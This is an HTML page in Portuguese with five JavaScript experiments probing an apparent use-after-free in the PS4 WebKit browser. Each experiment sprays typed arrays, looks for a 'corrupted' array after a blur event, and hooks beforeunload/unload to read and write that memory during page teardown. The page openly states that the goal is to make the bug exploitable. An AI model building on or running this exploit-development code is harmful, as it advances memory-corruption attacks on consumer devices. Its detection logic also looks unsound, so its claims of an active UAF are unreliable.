
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Teardown Analysis</title>
</head>
<body>

<h1>PS4 WebKit UAF - Teardown Crash Analysis</h1>

<h2>OBJETIVO</h2>
<p>Capturar o máximo de informações ANTES do crash ao apertar ATUALIZAR</p>
<p>Tentaremos interceptar eventos de cleanup e documentar o estado da memória</p>

<hr>

<h2>TESTE 1: Interceptar Eventos de Teardown</h2>
<p>Monitora eventos que ocorrem antes do crash</p>
<button onclick="runTeardownTest1()">EXECUTAR TESTE 1</button>
<div id="result1"></div>

<script>
function runTeardownTest1() {
    const result = document.getElementById('result1');
    result.innerHTML = '<h3>TESTE 1: Event Monitoring</h3>';
    result.innerHTML += '<p>Instalando monitores de eventos...</p>';
    
    // Log de eventos
    let eventLog = [];
    
    function logEvent(event) {
        const timestamp = Date.now();
        eventLog.push({
            time: timestamp,
            type: event.type,
            target: event.target ? event.target.nodeName : 'unknown'
        });
        console.log('[' + timestamp + '] Event: ' + event.type);
    }
    
    // Interceptar TODOS os eventos possíveis de cleanup
    const events = [
        'beforeunload', 'unload', 'pagehide', 
        'visibilitychange', 'freeze', 'blur',
        'DOMContentLoaded', 'readystatechange'
    ];
    
    events.forEach(evt => {
        window.addEventListener(evt, logEvent, true);
        document.addEventListener(evt, logEvent, true);
    });
    
    result.innerHTML += '<p>Monitores instalados para: ' + events.join(', ') + '</p>';
    
    // Criar estrutura UAF
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    result.innerHTML += '<p>Controllers criados</p>';
    result.innerHTML += '<h3>APERTE OPTIONS AGORA!</h3>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>Blur detectado - executando UAF...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO!</h3>';
        result.innerHTML += '<p>Array corrompido detectado</p>';
        
        // Interceptar beforeunload para capturar estado
        window.addEventListener('beforeunload', function(e) {
            result.innerHTML += '<p style="color:red;font-weight:bold;">BEFOREUNLOAD TRIGGERED!</p>';
            result.innerHTML += '<p>Tentando salvar estado antes do crash...</p>';
            
            try {
                // Tentar acessar array corrompido durante cleanup
                const val = corrupted[0];
                result.innerHTML += '<p>Array ainda acessível: ' + val + '</p>';
                
                // Tentar ler múltiplos offsets
                for(let i = 0; i < 8; i++) {
                    try {
                        const v = corrupted[i];
                        result.innerHTML += '<p>[' + i + '] = ' + v + '</p>';
                    } catch(err) {
                        result.innerHTML += '<p>[' + i + '] ERRO: ' + err.message + '</p>';
                    }
                }
            } catch(error) {
                result.innerHTML += '<p style="color:red;">ERRO ao acessar array: ' + error.message + '</p>';
            }
            
            // Log de eventos capturados
            result.innerHTML += '<h4>Eventos Capturados:</h4>';
            result.innerHTML += '<pre>' + JSON.stringify(eventLog, null, 2) + '</pre>';
            
        }, true);
        
        result.innerHTML += '<p style="color:yellow;font-weight:bold;">AGORA: Aperte OPTIONS e clique em ATUALIZAR</p>';
        result.innerHTML += '<p>Observação: Tentaremos capturar dados antes do crash</p>';
    };
}
</script>

<hr>

<h2>TESTE 2: Preservar Estado em Storage</h2>
<p>Tenta salvar informações críticas antes do crash</p>
<button onclick="runTeardownTest2()">EXECUTAR TESTE 2</button>
<div id="result2"></div>

<script>
function runTeardownTest2() {
    const result = document.getElementById('result2');
    result.innerHTML = '<h3>TESTE 2: State Preservation</h3>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    result.innerHTML += '<p>Controllers criados</p>';
    result.innerHTML += '<h3>APERTE OPTIONS AGORA!</h3>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        let corruptedIndex = -1;
        
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                corruptedIndex = i;
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO - Preparando captura de estado</h3>';
        
        // Capturar estado ANTES do teardown
        let preState = {
            timestamp: Date.now(),
            corruptedIndex: corruptedIndex,
            values: [],
            memorySnapshot: []
        };
        
        // Ler todos os valores acessíveis
        for(let i = 0; i < 64; i++) {
            try {
                const val = corrupted[i];
                const buf = new ArrayBuffer(8);
                const fview = new Float64Array(buf);
                const iview = new BigUint64Array(buf);
                fview[0] = val;
                preState.values.push({
                    offset: i,
                    float: val,
                    hex: '0x' + iview[0].toString(16).padStart(16, '0')
                });
            } catch(e) {
                preState.values.push({
                    offset: i,
                    error: e.message
                });
            }
        }
        
        result.innerHTML += '<p>Estado pré-teardown capturado: ' + preState.values.length + ' offsets</p>';
        
        // Tentar salvar em múltiplos lugares
        window.preStateBackup = preState;
        
        try {
            sessionStorage.setItem('uaf_prestate', JSON.stringify(preState));
            result.innerHTML += '<p>Estado salvo em sessionStorage</p>';
        } catch(e) {
            result.innerHTML += '<p>sessionStorage falhou: ' + e.message + '</p>';
        }
        
        // Interceptar unload
        window.addEventListener('unload', function() {
            console.log('UNLOAD - Estado:', preState);
            
            // Última tentativa de acessar array
            try {
                const finalVal = corrupted[0];
                console.log('Array ainda acessível em unload:', finalVal);
            } catch(e) {
                console.log('Array inacessível em unload:', e.message);
            }
        }, true);
        
        // Interceptar beforeunload
        window.addEventListener('beforeunload', function(e) {
            result.innerHTML += '<h3 style="color:red;">BEFOREUNLOAD!</h3>';
            
            // Capturar estado durante teardown
            let duringState = {
                timestamp: Date.now(),
                values: []
            };
            
            for(let i = 0; i < 8; i++) {
                try {
                    duringState.values.push({
                        offset: i,
                        value: corrupted[i]
                    });
                } catch(err) {
                    duringState.values.push({
                        offset: i,
                        error: err.message
                    });
                }
            }
            
            result.innerHTML += '<h4>Estado DURANTE teardown:</h4>';
            result.innerHTML += '<pre>' + JSON.stringify(duringState, null, 2) + '</pre>';
            
            // Comparar
            result.innerHTML += '<h4>Comparação Pré vs Durante:</h4>';
            for(let i = 0; i < 8; i++) {
                const pre = preState.values[i];
                const during = duringState.values[i];
                
                if (pre && during) {
                    const changed = pre.float !== during.value;
                    result.innerHTML += '<p>[' + i + '] ' + (changed ? 'MUDOU' : 'Igual') + '</p>';
                }
            }
            
        }, true);
        
        result.innerHTML += '<p style="color:yellow;font-weight:bold;">AGORA: Aperte OPTIONS e ATUALIZAR</p>';
        result.innerHTML += '<p>O estado será capturado antes do crash</p>';
    };
}
</script>

<hr>

<h2>TESTE 3: Análise de Referências</h2>
<p>Verifica quantas referências ao array existem e tenta forçar limpeza manual</p>
<button onclick="runTeardownTest3()">EXECUTAR TESTE 3</button>
<div id="result3"></div>

<script>
function runTeardownTest3() {
    const result = document.getElementById('result3');
    result.innerHTML = '<h3>TESTE 3: Reference Analysis</h3>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    // Criar referências adicionais para testar
    window.globalRefs = [];
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
        
        // Guardar algumas referências globais
        if (i % 100 === 0) {
            window.globalRefs.push(ctrl);
        }
    }
    
    result.innerHTML += '<p>Controllers criados com referências globais</p>';
    result.innerHTML += '<h3>APERTE OPTIONS AGORA!</h3>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        let corruptedInGlobal = false;
        
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                
                // Verificar se está nas refs globais
                for(let ref of window.globalRefs) {
                    if (ref[0] === PATTERN) {
                        corruptedInGlobal = true;
                        break;
                    }
                }
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO!</h3>';
        result.innerHTML += '<p>Array corrompido também em referências globais: ' + corruptedInGlobal + '</p>';
        
        // Tentar liberar referências locais
        result.innerHTML += '<h4>Teste de Limpeza Manual:</h4>';
        
        result.innerHTML += '<p>1. Limpando array local controllers...</p>';
        controllers = null;
        
        result.innerHTML += '<p>2. Limpando spray...</p>';
        spray = null;
        
        result.innerHTML += '<p>3. Tentando forçar GC...</p>';
        for(let i = 0; i < 100; i++) {
            let trash = new Array(1000);
        }
        
        result.innerHTML += '<p>4. Verificando se array global ainda acessível...</p>';
        try {
            for(let ref of window.globalRefs) {
                if (ref[0] === PATTERN) {
                    result.innerHTML += '<p>Ref global ainda válida: [0] = ' + ref[0] + '</p>';
                    
                    // Tentar escrever
                    ref[2] = 0xDEADBEEF;
                    result.innerHTML += '<p>Escrita bem sucedida: [2] = ' + ref[2] + '</p>';
                }
            }
        } catch(e) {
            result.innerHTML += '<p style="color:red;">ERRO ao acessar refs globais: ' + e.message + '</p>';
        }
        
        window.addEventListener('beforeunload', function(e) {
            result.innerHTML += '<h3 style="color:red;">BEFOREUNLOAD - Testando refs globais</h3>';
            
            try {
                for(let i = 0; i < window.globalRefs.length; i++) {
                    const ref = window.globalRefs[i];
                    if (ref[0] === PATTERN) {
                        result.innerHTML += '<p>Ref[' + i + '] ainda acessível</p>';
                        
                        // Tentar múltiplas operações
                        for(let j = 0; j < 8; j++) {
                            try {
                                const val = ref[j];
                                result.innerHTML += '<p>  [' + j + '] = ' + val + '</p>';
                            } catch(err) {
                                result.innerHTML += '<p style="color:red;">  [' + j + '] ERRO: ' + err.message + '</p>';
                                // Este erro pode indicar o ponto de falha!
                            }
                        }
                    }
                }
            } catch(e) {
                result.innerHTML += '<p style="color:red;">ERRO CRÍTICO: ' + e.message + '</p>';
                result.innerHTML += '<p>Stack trace: ' + e.stack + '</p>';
            }
            
            result.innerHTML += '<p>Se crashar AGORA, é durante limpeza de refs globais</p>';
        }, true);
        
        result.innerHTML += '<p style="color:yellow;font-weight:bold;">AGORA: Aperte OPTIONS e ATUALIZAR</p>';
        result.innerHTML += '<p>Crash indicará qual referência causa o problema</p>';
    };
}
</script>

<hr>

<h2>TESTE 4: Crash Point Identification</h2>
<p>Tenta identificar EXATAMENTE onde o crash ocorre</p>
<button onclick="runTeardownTest4()">EXECUTAR TESTE 4</button>
<div id="result4"></div>

<script>
function runTeardownTest4() {
    const result = document.getElementById('result4');
    result.innerHTML = '<h3>TESTE 4: Crash Point Detection</h3>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    result.innerHTML += '<h3>APERTE OPTIONS AGORA!</h3>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO - Instalando detectores</h3>';
        
        let checkpoints = [];
        
        function checkpoint(msg) {
            const cp = {
                time: Date.now(),
                message: msg
            };
            checkpoints.push(cp);
            console.log('[CHECKPOINT]', msg);
        }
        
        // Interceptar TODOS os eventos possíveis
        window.addEventListener('beforeunload', function(e) {
            checkpoint('beforeunload START');
            
            result.innerHTML += '<h3 style="color:red;">BEFOREUNLOAD SEQUENCE</h3>';
            
            // Teste sequencial de operações
            const operations = [
                () => { checkpoint('Op1: Read corrupted[0]'); return corrupted[0]; },
                () => { checkpoint('Op2: Read corrupted[1]'); return corrupted[1]; },
                () => { checkpoint('Op3: Write corrupted[2]'); corrupted[2] = 0xAAAA; },
                () => { checkpoint('Op4: Loop read 0-7'); 
                    for(let i=0; i<8; i++) corrupted[i];
                },
                () => { checkpoint('Op5: Create new Float64Array'); 
                    let x = new Float64Array(8);
                },
                () => { checkpoint('Op6: Access controllers array'); 
                    return controllers.length;
                },
                () => { checkpoint('Op7: Access spray array'); 
                    return spray.length;
                }
            ];
            
            for(let i = 0; i < operations.length; i++) {
                try {
                    const resultOp = operations[i]();
                    result.innerHTML += '<p style="color:green;">Op' + (i+1) + ': SUCCESS</p>';
                } catch(err) {
                    result.innerHTML += '<p style="color:red;">Op' + (i+1) + ': FAILED - ' + err.message + '</p>';
                    checkpoint('Op' + (i+1) + ' FAILED: ' + err.message);
                    break; // Parar no primeiro erro
                }
            }
            
            checkpoint('beforeunload END');
            
        }, true);
        
        window.addEventListener('unload', function() {
            checkpoint('unload START');
            console.log('Final checkpoints:', checkpoints);
            checkpoint('unload END');
        }, true);
        
        window.addEventListener('pagehide', function() {
            checkpoint('pagehide triggered');
        }, true);
        
        result.innerHTML += '<p>Detectores instalados</p>';
        result.innerHTML += '<p style="color:yellow;font-weight:bold;">AGORA: Aperte OPTIONS e ATUALIZAR</p>';
        result.innerHTML += '<p>Console log mostrará última operação antes do crash</p>';
        result.innerHTML += '<p><b>IMPORTANTE:</b> Abra o console ANTES (F12 se disponível)</p>';
    };
}
</script>

<hr>

<h2>TESTE 5: Controlled Teardown</h2>
<p>Tenta controlar a ordem de limpeza para evitar crash</p>
<button onclick="runTeardownTest5()">EXECUTAR TESTE 5</button>
<div id="result5"></div>

<script>
function runTeardownTest5() {
    const result = document.getElementById('result5');
    result.innerHTML = '<h3>TESTE 5: Controlled Cleanup</h3>';
    result.innerHTML += '<p><b>Objetivo:</b> Limpar manualmente para ver se evitamos crash</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    result.innerHTML += '<h3>APERTE OPTIONS AGORA!</h3>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        let corruptedIdx = -1;
        
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                corruptedIdx = i;
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF ATIVO - Iniciando limpeza controlada</h3>';
        
        window.addEventListener('beforeunload', function(e) {
            result.innerHTML += '<h3 style="color:orange;">TENTANDO LIMPEZA MANUAL</h3>';
            
            try {
                // Estratégia 1: Zerar o array corrompido
                result.innerHTML += '<p>1. Zerando array corrompido...</p>';
                for(let i = 0; i < 8; i++) {
                    corrupted[i] = 0;
                }
                result.innerHTML += '<p>Array zerado com sucesso</p>';
                
                // Estratégia 2: Remover referências
                result.innerHTML += '<p>2. Removendo referência da variável corrupted...</p>';
                corrupted = null;
                result.innerHTML += '<p>Referência removida</p>';
                
                // Estratégia 3: Limpar array controllers
                result.innerHTML += '<p>3. Limpando array controllers...</p>';
                controllers[corruptedIdx] = null;
                result.innerHTML += '<p>Entrada do array limpa</p>';
                
                // Estratégia 4: Limpar spray
                result.innerHTML += '<p>4. Limpando spray...</p>';
                spray = null;
                result.innerHTML += '<p>Spray removido</p>';
                
                // Estratégia 5: Forçar GC
                result.innerHTML += '<p>5. Tentando forçar GC...</p>';
                for(let i = 0; i < 1000; i++) {
                    let trash = new Array(100);
                }
                result.innerHTML += '<p>GC forçado</p>';
                
                result.innerHTML += '<h3 style="color:green;">LIMPEZA MANUAL COMPLETA</h3>';
                result.innerHTML += '<p>Se ainda crashar, o problema é mais profundo</p>';
                
            } catch(err) {
                result.innerHTML += '<p style="color:red;">ERRO durante limpeza: ' + err.message + '</p>';
            }
            
        }, true);
        
        result.innerHTML += '<p style="color:yellow;font-weight:bold;">AGORA: Aperte OPTIONS e ATUALIZAR</p>';
        result.innerHTML += '<p>Veremos se limpeza manual previne o crash</p>';
    };
}
</script>

<hr>

<h2>ANÁLISE ESPERADA</h2>

<h3>Hipóteses sobre o Crash:</h3>
<ol>
<li><b>Double-Free:</b> Navegador tenta liberar memória já liberada</li>
<li><b>Referência Inválida:</b> Cleanup acessa ponteiro corrompido</li>
<li><b>Vtable Corruption:</b> Array corrompido tem vtable inválida</li>
<li><b>Destructor Failure:</b> Destructor do Float64Array falha ao acessar dados corrompidos</li>
</ol>

<h3>O Que os Testes Revelam:</h3>
<p><b>Teste 1:</b> Quais eventos são disparados antes do crash</p>
<p><b>Teste 2:</b> Se conseguimos acessar o array durante teardown</p>
<p><b>Teste 3:</b> Se refs globais mudam o comportamento</p>
<p><b>Teste 4:</b> Exatamente qual operação causa o crash</p>
<p><b>Teste 5:</b> Se limpeza manual previne o crash</p>

<h3>Informações Críticas a Capturar:</h3>
<ul>
<li>Última operação antes do crash (console log)</li>
<li>Estado do array corrompido durante teardown</li>
<li>Mudanças nos valores entre pré e durante teardown</li>
<li>Se erro ocorre ao ler, escrever ou destruir</li>
<li>Se limpeza manual previne ou não o crash</li>
</ul>

<hr>

<p><b>INSTRUÇÕES IMPORTANTES:</b></p>
<ol>
<li>Execute cada teste SEPARADAMENTE (recarregue entre testes)</li>
<li>Tente abrir o console do navegador (F12 ou equivalente)</li>
<li>Anote EXATAMENTE quando o crash ocorre em cada teste</li>
<li>Compare resultados para identificar padrão</li>
<li>Se algum teste NÃO crashar, isso é CRÍTICO!</li>
</ol>

<p><b>O crash no ATUALIZAR pode ser a chave para transformar este UAF limitado em algo explorável!</b></p>

</body>
</html>
